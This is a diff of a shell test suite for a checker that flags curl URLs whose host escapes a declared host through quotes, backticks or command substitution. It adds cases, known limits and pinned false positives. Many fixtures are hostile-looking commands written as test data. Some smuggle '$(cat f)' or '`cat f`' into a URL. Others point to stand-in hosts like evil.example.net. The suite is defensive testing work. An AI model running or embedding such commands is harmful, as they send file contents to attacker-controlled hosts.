@@ -862,9 +862,8 @@ check_msg "a backtick then a command after userinfo" "$sample_dir/sc4.sh" \
   'curl https://u@erpc.global`echo .evil.example.net`/p' \
   'a backtick inside the host starts a command'
 
-# CLOSED: a quote that ends the host, followed at once by `$` or a backtick.
-# Nothing but an interpolation begins that way, and in the other languages
-# here the shape is a syntax error rather than a correct line.
+# CLOSED: a quote that ends the host, followed at once by `$`. The one
+# correct line this reports, a regex end anchor, is pinned further down.
 check_msg "a closing quote then a command substitution" "$sample_dir/sc5.sh" \
   'curl "https://erpc.global"$(cat f)/p' \
   'a quote ends the host and the shell would join what follows it'
@@ -877,9 +876,12 @@ check_msg "a closing single quote then a variable" "$sample_dir/sc7.sh" \
   "curl 'https://erpc.global'\$X/p" \
   'a quote ends the host and the shell would join what follows it'
 
-check_msg "a closing quote then a backtick" "$sample_dir/sc8.sh" \
-  'curl "https://erpc.global"`cat f`"/p"' \
-  'a quote ends the host and the shell would join what follows it'
+# A quote then a BACKTICK was closed here until a review found it reporting
+# rustdoc and Markdown, which end inline code around a quoted URL in exactly
+# that pair. It is the same ambiguity as a backtick after a declared host,
+# and is pinned as open with the other members of that kind below.
+check "KNOWN LIMIT: a closing quote then a backtick" allow "$sample_dir/sc8.sh" \
+  'curl "https://erpc.global"`cat f`"/p"'
 
 # ...and the correct lines that share the shape. The quote rule must not touch
 # a method call on a string literal, and the backtick rule must not touch a
@@ -986,7 +988,137 @@ check_msg "a closing quote then an underscore" "$sample_dir/sq11.sh" \
   'curl "https://erpc.global"_x.evil.example.net/x' \
   'a quote ends the host and the shell would join what follows it'
 
-# ...and the correct lines the two closes must not touch. Building a URL
+# The doubled quote is closed only when a third character follows that is
+# not the same quote; this is the single-quote arm of it.
+check_msg "a closing single quote then the same quote again" "$sample_dir/sq8b.sh" \
+  "curl 'https://erpc.global''.evil.example.net'" \
+  'a quote ends the host and the shell would join what follows it'
+
+# CLOSED: a quote right after the scheme reports BY DEFAULT. The list this
+# replaced named what could begin a host and missed each of the shapes
+# below; one case per kind, so that no member of the old list or of its
+# complement is untested.
+check_msg "a quoted scheme, then slashes outside the quote" "$sample_dir/sq15.sh" \
+  'curl "https:"//evil.example.net/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a single-quoted scheme, then slashes outside the quote" "$sample_dir/sq16.sh" \
+  "curl 'https:'//evil.example.net/x" \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quote between the two slashes" "$sample_dir/sq17.sh" \
+  'curl https:/"/evil.example.net/x"' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted IP-literal right after the scheme" "$sample_dir/sq18.sh" \
+  'curl https://"[2001:db8::1]"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted percent-encoded host right after the scheme" "$sample_dir/sq19.sh" \
+  'curl https://"%65vil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted host beginning with a hyphen" "$sample_dir/sq20.sh" \
+  'curl https://"-evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+# U+00E9 as its two UTF-8 bytes. check_msg writes with %s, so an escape in
+# the argument would reach the fixture as text.
+e_acute=$(printf '\303\251')
+check_msg "a quoted non-ASCII host right after the scheme" "$sample_dir/sq21.sh" \
+  "curl https://\"${e_acute}vil.example.net\"/x" \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted host beginning with a digit" "$sample_dir/sq22.sh" \
+  'curl https://"8.evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted host beginning with an underscore" "$sample_dir/sq23.sh" \
+  'curl https://"_x.evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted brace expansion right after the scheme" "$sample_dir/sq24.sh" \
+  'curl https://"{a,b}.evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted command substitution right after the scheme" "$sample_dir/sq25.sh" \
+  'curl https://"`cat f`"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quote, then the other quote, right after the scheme" "$sample_dir/sq26.sh" \
+  "curl https://\"'evil.example.net'\"/x" \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "an empty string right after the scheme" "$sample_dir/sq27.sh" \
+  'curl https://""evil.example.net/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+# CLOSED: a host that is wholly an expression, then a quote and a letter.
+check_msg "a templated host, then a quoted literal domain" "$sample_dir/sq29.sh" \
+  'curl https://${X}"evil.example.net"/x' \
+  'a quote ends a host that is wholly an expression'
+
+# The followers that stay ALLOWED after a string that is exactly a scheme,
+# one case each, so that dropping any one from the list fails a case. `.`
+# and a space are sq12 and sq13 below.
+check "a scheme string at end of line" allow "$sample_dir/sa1.sh" \
+  'x="https://"'
+
+check "a scheme string closing a call" allow "$sample_dir/sa2.rs" \
+  'let h = url.strip_prefix("https://");'
+
+check "a scheme string as a first argument" allow "$sample_dir/sa3.ts" \
+  "f('https://', h);"
+
+check "a scheme string ending a statement" allow "$sample_dir/sa4.ts" \
+  "const s = 'https://';"
+
+check "a scheme string ending an array" allow "$sample_dir/sa5.ts" \
+  "const s = ['https://'];"
+
+check "a scheme string ending an object" allow "$sample_dir/sa6.json" \
+  '{"scheme": "https://"}'
+
+check "a scheme string concatenated without a space" allow "$sample_dir/sa7.ts" \
+  "let u = 'https://'+host;"
+
+check "a scheme string as a fallback" allow "$sample_dir/sa8.ts" \
+  "let u = x || 'https://'||y;"
+
+# A triple-quoted string, and inline code around a quoted URL. Both end in
+# a pair that the closes above used to report.
+check "a TOML multi-line string around a declared host" allow "$sample_dir/sa9.toml" \
+  'u = """https://erpc.global"""'
+
+check "a Python triple-quoted string around a declared host" allow "$sample_dir/sa10.py" \
+  "u = '''https://erpc.global'''"
+
+check "a quoted URL inside rustdoc inline code" allow "$sample_dir/sa11.rs" \
+  '/// Defaults to `"https://erpc.global"`.'
+
+check "a quoted URL inside Markdown inline code" allow "$sample_dir/sa12.md" \
+  'Set `X` to `"https://erpc.global"` here.'
+
+# NAMED FALSE POSITIVES: correct lines the closes report, as the header and
+# docs/public-hosts.md say. Pinned so that the statement and the behaviour
+# cannot drift apart.
+check_msg "FALSE POSITIVE: a regex end anchor after a quoted URL" "$sample_dir/fp1.sh" \
+  "grep -x '\"https://erpc.global\"\$' f" \
+  'a quote ends the host and the shell would join what follows it'
+
+check_msg "FALSE POSITIVE: a word run on from inline code" "$sample_dir/fp2.md" \
+  'See `https://erpc.global`s docs.' \
+  'a backtick inside the host starts a command'
+
+check_msg "FALSE POSITIVE: a scheme string in a shell case pattern" "$sample_dir/fp3.sh" \
+  'case "$u" in "https://"*) ;; esac' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "FALSE POSITIVE: a scheme string as a YAML key" "$sample_dir/fp4.yml" \
+  '"https://": scheme' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+# ...and the correct lines the closes must not touch. Building a URL
 # from a runtime host with nothing literal in it is the wholly-templated
 # case the header states; a nested quote is how a jq filter or a grep
 # pattern quotes a JSON string inside a shell argument.
@@ -1016,6 +1148,15 @@ check "KNOWN LIMIT: a closing quote then the other quote" allow "$sample_dir/sk9
 
 check "KNOWN LIMIT: a closing quote then a hyphen" allow "$sample_dir/sk10.sh" \
   'curl "https://erpc.global"-evil.example.net/x'
+
+check "KNOWN LIMIT: a quote after the scheme, then an excepted follower" allow "$sample_dir/sk11.sh" \
+  'curl https://"+evil.example.net"/x'
+
+check "KNOWN LIMIT: a closing quote three times, then a dot" allow "$sample_dir/sk12.sh" \
+  'curl "https://erpc.global""".evil.example.net/x'
+
+check "KNOWN LIMIT: a templated host, then a quote and a dot" allow "$sample_dir/sk13.sh" \
+  'curl https://${X}".evil.example.net"/x'
 
 # --- the invariant ------------------------------------------------------
 #
